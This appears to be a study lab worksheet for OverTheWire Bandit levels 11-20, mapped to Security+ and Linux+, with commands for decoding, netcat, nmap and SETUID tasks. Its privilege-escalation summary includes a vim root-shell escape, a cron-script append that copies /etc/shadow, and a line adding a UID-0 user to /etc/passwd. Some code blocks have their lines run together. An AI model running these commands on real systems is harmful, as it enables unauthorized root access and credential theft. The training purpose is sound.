---
title: "Bandit Levels 11-20: File Permissions and Privilege Escalation"
difficulty: Intermediate
Cert:
  - Sec+
  - Linux+
Exam-Objectives:
  - Sec+ 4.1
  - Sec+ 4.5
  - Lin+ 2.1
  - Lin+ 2.2
created: 2026-02-13
completed:
time-hours: 2
complete: false
GitHub-ready: false
evidence-files: 10
notes:
tags:
  - linux
  - file-permissions
  - privilege-escalation
  - cron-jobs
  - suid-binaries
  - soc-analyst-skills
  - overthewire
---
---
## Scenario

You're investigating a **Linux privilege escalation attack**. The attacker exploited weak file permissions and SUID binaries to gain root access. To understand the attack chain, you're walking through common privilege escalation techniques in a safe Bandit environment.

**Levels 11-20 focus on**:

- **File permissions** (chmod, ownership, SUID/SGID)
- **Encoding schemes** (ROT13, hex, compression)
- **Scheduled tasks** (cron jobs)
- **Network services** (netcat, SSH port forwarding)
- **Privilege escalation** through misconfigurations

This lab simulates **real penetration testing** and **incident response** scenarios where attackers chain multiple vulnerabilities to escalate privileges.

## Learning Objectives

By completing Levels 11-20, you will demonstrate ability to:

- **Decode obfuscated text** (ROT13, hex, gzip, bzip2, tar)
- **Analyze file permissions** to identify SUID binaries
- **Execute commands through SSH** without interactive shell
- **Manipulate cron jobs** for persistence
- **Use netcat** for network connections
- **Exploit SETUID binaries** for privilege escalation
- **Chain multiple techniques** to solve complex challenges

## Required Environment

### Hardware/Software

- **SSH Client**: Same as Lab 1
- **Internet Connection**: Access to `bandit.labs.overthewire.org`
- **Password from Lab 1**: Starting password for `bandit11`

### Host System

- Same as Lab 1

## Deliverables

### Evidence Files (Required)

1. `bandit11-rot13-decode.txt` - ROT13 decoded password
2. `bandit12-hex-dump-reverse.txt` - Multi-layer decompression steps
3. `bandit13-ssh-private-key.txt` - SSH private key authentication
4. `bandit14-localhost-connection.txt` - Netcat to localhost:30000
5. `bandit15-ssl-connection.txt` - OpenSSL to localhost:30001
6. `bandit16-port-scan-nmap.txt` - Nmap scan results
7. `bandit17-diff-files.txt` - Password found via file diff
8. `bandit18-ssh-command-execution.txt` - Non-interactive SSH
9. `bandit19-suid-binary-exploit.txt` - SETUID privilege escalation
10. `bandit20-setuid-network.txt` - Network-based SETUID exploitation

### Documentation (Required)

- **Privilege escalation techniques**: Documented attack vectors
- **Decoding workflow**: Multi-layer decompression process
- **SUID binary audit**: How to find and exploit SETUID files

## Lab Tasks

### Level 11: ROT13 Decoding

**Connection**:

```bash
ssh bandit11@bandit.labs.overthewire.org -p 2220
```

**Objective**: Decode ROT13-encoded text.

#### Background: ROT13

ROT13 is a simple letter substitution cipher that replaces each letter with the 13th letter after it:

- A → N, B → O, C → P, ..., M → Z
- N → A, O → B, P → C, ..., Z → M

#### Challenge

- [ ] **View encoded data**:
    
    ```bash
    cat data.txt
    # Output: Gur cnffjbeq vf 5Gr8L4qetPEsPk8htqjhRK8XSP6x2RHh
    ```
    
- [ ] **Decode with tr (translate)**:
    
    ```bash
    cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
    # Output: The password is [password for bandit12]
    ```
    

**Breakdown**:

- `tr 'A-Za-z' 'N-ZA-Mn-za-m'`
    - Input alphabet: A-Z, a-z
    - Output alphabet: N-Z (13 letters ahead), then A-M (wrap around)

**Evidence**: Save to `bandit11-rot13-decode.txt`

**🔑 Key Concept**: ROT13 is symmetric (encoding = decoding). Attackers use it to obfuscate malware strings.

---

### Level 12: Hexdump Reversal and Multi-Layer Decompression

**Connection**:

```bash
ssh bandit12@bandit.labs.overthewire.org -p 2220
```

**Objective**: Reverse hexdump and decompress multiple layers (gzip, bzip2, tar).

#### Challenge

- [ ] **Step 1: Create working directory**:
    
    ```bash
    mkdir /tmp/bandit12work
    cp data.txt /tmp/bandit12work/
    cd /tmp/bandit12work/
    ```
    
- [ ] **Step 2: Reverse hexdump**:
    
    ```bash
    xxd -r data.txt > data.bin
    ```
    
- [ ] **Step 3: Identify file type**:
    
    ```bash
    file data.bin
    # Output: data.bin: gzip compressed data
    ```
    
- [ ] **Step 4: Decompress gzip**:
    
    ```bash
    mv data.bin data.gz
    gunzip data.gz
    # Creates: data
    
    file data
    # Output: data: bzip2 compressed data
    ```
    
- [ ] **Step 5: Decompress bzip2**:
    
    ```bash
    mv data data.bz2
    bunzip2 data.bz2
    # Creates: data
    
    file data
    # Output: data: gzip compressed data
    ```
    
- [ ] **Step 6: Repeat decompression (gzip → tar → tar → bzip2 → tar → gzip)**:
    
    ```bash
    # Keep running:
    file data
    # Then apply appropriate decompression based on output
    
    # Example sequence:
    gunzip data.gz          # if gzip
    bunzip2 data.bz2        # if bzip2
    tar -xf data.tar        # if tar archive
    ```
    
- [ ] **Final step: Read ASCII text**:
    
    ```bash
    file data8
    # Output: data8: ASCII text
    
    cat data8
    # Output: The password is [password for bandit13]
    ```
    

**Evidence**: Document the full decompression sequence in `bandit12-hex-dump-reverse.txt`

**🔑 Key Concept**: Attackers nest compression layers to evade signature-based detection. Practice using `file` to identify each layer.

---

### Level 13: SSH Private Key Authentication

**Connection**:

```bash
ssh bandit13@bandit.labs.overthewire.org -p 2220
```

**Objective**: Use SSH private key to login as bandit14 (instead of password).

#### Challenge

- [ ] **View private key**:
    
    ```bash
    ls
    # Output: sshkey.private
    
    cat sshkey.private
    # Output: -----BEGIN RSA PRIVATE KEY-----
    #         [key data]
    #         -----END RSA PRIVATE KEY-----
    ```
    
- [ ] **Connect using private key**:
    
    ```bash
    ssh -i sshkey.private bandit14@localhost -p 2220
    # No password required
    ```
    
- [ ] **Retrieve password** (for next level):
    
    ```bash
    cat /etc/bandit_pass/bandit14
    # Output: [password for bandit14]
    ```
    

**Evidence**: Save key usage process to `bandit13-ssh-private-key.txt`

**🔑 Key Concept**: Private keys = authentication without passwords. Protect with passphrases and 600 permissions.

---

### Level 14: Netcat Localhost Connection

**Connection**:

```bash
ssh bandit14@bandit.labs.overthewire.org -p 2220
```

**Objective**: Submit current password to localhost:30000 using netcat.

#### Challenge

- [ ] **Get current password**:
    
    ```bash
    cat /etc/bandit_pass/bandit14
    # Output: [current password]
    ```
    
- [ ] **Send to localhost port 30000**:
    
    ```bash
    echo [current-password] | nc localhost 30000
    # Output: Correct!
    #         [password for bandit15]
    ```
    

**Alternative (interactive netcat)**:

```bash
nc localhost 30000
# Paste password
# Press Enter
```

**Evidence**: Save to `bandit14-localhost-connection.txt`

**🔑 Key Concept**: Netcat (`nc`) = "Swiss Army knife" for network connections. Used in pentesting and C2 communication.

---

### Level 15: SSL/TLS Connection with OpenSSL

**Connection**:

```bash
ssh bandit15@bandit.labs.overthewire.org -p 2220
```

**Objective**: Submit password over encrypted SSL connection.

#### Challenge

- [ ] **Connect with OpenSSL s_client**:
    
    ```bash
    openssl s_client -connect localhost:30001# SSL handshake output...# ---# Paste current password:[paste password from /etc/bandit_pass/bandit15]# Press Enter# Output: Correct!#         [password for bandit16]
    ```
    

**Breakdown**:

- `s_client` = OpenSSL's test client for SSL/TLS connections
- `-connect localhost:30001` = target host and port

**Evidence**: Save to `bandit15-ssl-connection.txt`

**🔑 Key Concept**: OpenSSL s_client tests encrypted connections. Use `-showcerts` to view server certificate.

---

### Level 16: Port Scanning with Nmap

**Connection**:

```bash
ssh bandit16@bandit.labs.overthewire.org -p 2220
```

**Objective**: Scan localhost ports 31000-32000 to find SSL service.

#### Challenge

- [ ] **Scan port range**:
    
    ```bash
    nmap -p 31000-32000 localhost
    # Output:
    # PORT      STATE SERVICE
    # 31046/tcp open  unknown
    # 31518/tcp open  unknown
    # 31691/tcp open  unknown
    # 31790/tcp open  unknown
    # 31960/tcp open  unknown
    ```
    
- [ ] **Test each port with OpenSSL**:
    
    ```bash
    openssl s_client -connect localhost:31790
    # Paste current password
    
    # Output: Correct!
    # -----BEGIN RSA PRIVATE KEY-----
    # [SSH private key for bandit17]
    # -----END RSA PRIVATE KEY-----
    ```
    
- [ ] **Save private key**:
    
    ```bash
    # Copy key output to local file
    nano ~/bandit17.key
    # Paste key
    # Ctrl+X, Y, Enter
    
    chmod 600 ~/bandit17.key
    ```
    
- [ ] **Login as bandit17**:
    
    ```bash
    ssh -i ~/bandit17.key bandit17@localhost -p 2220
    ```
    

**Evidence**: Save nmap output to `bandit16-port-scan-nmap.txt`

**🔑 Key Concept**: Nmap discovers open ports. Combined with service probing, identify vulnerable services.

---

### Level 17: File Comparison with diff

**Connection**:

```bash
ssh bandit17@bandit.labs.overthewire.org -p 2220
```

**Objective**: Find the changed line between two files.

#### Challenge

- [ ] **Compare files**:
    
    ```bash
    ls# Output: passwords.new  passwords.olddiff passwords.old passwords.new# Output:# 42c42# < [old password]# ---# > [new password for bandit18]
    ```
    

**Breakdown**:

- `42c42` = line 42 changed
- `<` = line from passwords.old
- `>` = line from passwords.new (this is the password)

**Alternative (grep for unique line)**:

```bash
grep -v -f passwords.old passwords.new
# Output: [password for bandit18]
```

**Evidence**: Save to `bandit17-diff-files.txt`

**🔑 Key Concept**: `diff` identifies file changes. Essential for configuration auditing and incident response.

---

### Level 18: SSH with Command Execution

**Connection**: Special - requires command execution

**Objective**: File `.bashrc` logs you out immediately. Execute command via SSH without interactive shell.

#### Challenge

- [ ] **Attempt normal login** (FAILS):
    
    ```bash
    ssh bandit18@bandit.labs.overthewire.org -p 2220
    # Password: [from Level 17]
    # Output: Byebye !
    # Connection closed
    ```
    
- [ ] **Execute command via SSH**:
    
    ```bash
    ssh bandit18@bandit.labs.overthewire.org -p 2220 "cat readme"
    # Password: [from Level 17]
    # Output: [password for bandit19]
    ```
    

**Explanation**:

- SSH can execute commands without spawning interactive shell
- Bypasses `.bashrc` (only runs in interactive shells)

**Evidence**: Save to `bandit18-ssh-command-execution.txt`

**🔑 Key Concept**: SSH command execution useful for remote automation and bypassing login scripts.

---

### Level 19: SETUID Binary Exploitation

**Connection**:

```bash
ssh bandit19@bandit.labs.overthewire.org -p 2220
```

**Objective**: Use SETUID binary to read password file as bandit20.

#### Background: SETUID

SETUID (Set User ID) binaries run with the **file owner's permissions**, not the executor's.

Example:

- File owned by `root` with SETUID bit
- User `bandit19` executes it
- Binary runs as `root` (escalates privileges)

#### Challenge

- [ ] **Examine binary**:
    
    ```bash
    ls -l bandit20-do
    # Output: -rwsr-x--- 1 bandit20 bandit19 ... bandit20-do
    #         ^
    #         s = SETUID bit
    ```
    
- [ ] **Test binary**:
    
    ```bash
    ./bandit20-do id
    # Output: uid=11019(bandit19) euid=11020(bandit20) ...
    #         Real UID = bandit19
    #         Effective UID = bandit20 (escalated)
    ```
    
- [ ] **Read password file**:
    
    ```bash
    ./bandit20-do cat /etc/bandit_pass/bandit20
    # Output: [password for bandit20]
    ```
    

**Evidence**: Save to `bandit19-suid-binary-exploit.txt`

**🔑 Key Concept**: SETUID misconfigurations are critical privilege escalation vectors. Always audit with `find / -perm -4000`.

---

### Level 20: SETUID + Network Exploitation

**Connection**:

```bash
ssh bandit20@bandit.labs.overthewire.org -p 2220
```

**Objective**: Use SETUID binary that connects to localhost, sends current password, receives next password.

#### Challenge

- [ ] **Step 1: Start listener with current password**:
    
    ```bash
    # Terminal 1 (keep this open):
    echo [current password] | nc -l -p 12345 &
    # & = background process
    # -l = listen mode
    # -p 12345 = port 12345
    ```
    
- [ ] **Step 2: Connect SETUID binary to listener**:
    
    ```bash
    # Terminal 1 (same session):
    ./suconnect 12345
    # Output: Read: [current password]
    #         Password matches. Sending next password.
    #         [password for bandit21]
    ```
    

**Breakdown**:

1. Netcat listener sends current password on connection
2. `suconnect` binary connects as bandit21 (SETUID)
3. Binary validates password, returns next level password

**Evidence**: Save to `bandit20-setuid-network.txt`

**🔑 Key Concept**: Attackers chain network services + SETUID for remote privilege escalation.

---

## Privilege Escalation Techniques Summary

### SETUID Binary Audit

**Find all SETUID binaries**:

```bash
find / -perm -4000 -type f 2>/dev/null
```

**Common vulnerable SETUID binaries**:

- `nmap` (older versions allow shell escape)
- `vim` (if SETUID, can spawn shell)
- Custom binaries (improper input validation)

**Example exploit (vim)**:

```bash
vim -c ':!/bin/sh'
# If vim is SETUID root, spawns root shell
```

### Cron Job Exploitation

**Check cron jobs**:

```bash
crontab -l           # User cron jobs
ls -la /etc/cron.*   # System cron jobs
```

**Exploit writable cron script**:

```bash
# If /etc/cron.daily/backup.sh is world-writable:
echo 'cat /etc/shadow > /tmp/shadow_copy' >> /etc/cron.daily/backup.sh
# Wait for cron to execute (daily at midnight)
```

### File Permission Weaknesses

**World-writable files in privileged directories**:

```bash
find /etc -perm -002 -type f 2>/dev/null
# -002 = world-writable
```

**Improper ownership**:

```bash
# If /etc/passwd is writable, add root user:
echo 'hacker:x:0:0:root:/root:/bin/bash' >> /etc/passwd
```

---

## Decoding Workflow Reference

|Encoding|Decode Command|Example|
|---|---|---|
|**ROT13**|`tr 'A-Za-z' 'N-ZA-Mn-za-m'`|`cat file \| tr 'A-Za-z' 'N-ZA-Mn-za-m'`|
|**Hex dump**|`xxd -r`|`xxd -r hexfile > binary`|
|**Base64**|`base64 -d`|`base64 -d file.b64`|
|**gzip**|`gunzip` or `gzip -d`|`gunzip file.gz`|
|**bzip2**|`bunzip2`|`bunzip2 file.bz2`|
|**tar**|`tar -xf`|`tar -xf archive.tar`|
|**URL encoding**|`urldecode` (Perl)|`echo '%20' \| perl -pe 's/%([0-9A-Fa-f]{2})/chr(hex($1))/eg'`|

---

## Security Analyst Applications

### Incident Response Scenarios

**Scenario 1: Privilege Escalation Detection**

```bash
# Find recently modified SETUID binaries (attacker planted backdoor)
find / -perm -4000 -type f -mtime -7 2>/dev/null

# Check for unusual cron jobs
cat /etc/crontab
ls -la /var/spool/cron/crontabs/
```

**Scenario 2: Malware Analysis**

```bash
# Extract strings from obfuscated malware
strings malware.bin | grep -i "http"

# Reverse hexdump from memory dump
xxd -r memory.hex > memory.bin

# Decompress nested malware payload
file payload.bin
gunzip payload.gz
tar -xf payload.tar
```

**Scenario 3: Lateral Movement**

```bash
# Attacker used SSH key for persistence
find / -name "*.pub" -o -name "authorized_keys" 2>/dev/null

# Check SSH logs for key-based logins
grep "Accepted publickey" /var/log/auth.log
```

### Time Tracking

|Level|Estimated|Actual|Notes|
|---|---|---|---|
|11|5 min|___ min||
|12|20 min|___ min|Multi-layer decompression|
|13|10 min|___ min||
|14|5 min|___ min||
|15|10 min|___ min||
|16|15 min|___ min|Port scanning|
|17|5 min|___ min||
|18|10 min|___ min||
|19|15 min|___ min|SETUID exploitation|
|20|15 min|___ min|Network + SETUID|
|**Total**|**120 min**|**___ min**||

---

## Exam Relevance Notes

### Security+ (SY0-701) Mapping

**Objective 4.1: Security assessment tools**

- Nmap (network mapper)
- Netcat (network utility)
- OpenSSL (SSL/TLS testing)

**Objective 4.5: Incident response**

- File integrity monitoring (diff)
- Log analysis (grep, strings)
- Privilege escalation detection (SETUID audit)

### Linux+ (XK0-006) Mapping

**Objective 2.2: File permissions**

- SETUID/SETGID/Sticky bit
- chmod numeric notation (4755 = SETUID + rwxr-xr-x)
- Ownership (chown, chgrp)

---

## Submission Checklist

Before moving to Levels 21-30, verify:

- [ ] All 10 evidence files documented
- [ ] Passwords saved for Levels 11-21
- [ ] Privilege escalation techniques documented
- [ ] Decoding workflow reference completed
- [ ] Time tracking updated

**Final Evidence Count**: 10 files  
**Passwords Collected**: 10 passwords (bandit11 → bandit21)  
**Ready for Next Lab**: Yes / No

---

## Next Steps

After completing Levels 11-20:

1. **Proceed to Bandit Lab 3** (Levels 21-30): Advanced Linux forensics
2. **Practice SETUID audits**: Run `find / -perm -4000` on your VMs
3. **Study privilege escalation**: Research GTFOBins for binary exploits
4. **Prepare for Security+**: Review attack frameworks (MITRE ATT&CK)

**Additional Resources**:

- [GTFOBins](https://gtfobins.github.io/) - SETUID exploitation techniques
- [PEAS (Privilege Escalation Awesome Scripts)](https://github.com/carlospolop/PEASS-ng)
- [Linux Privilege Escalation Guide](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)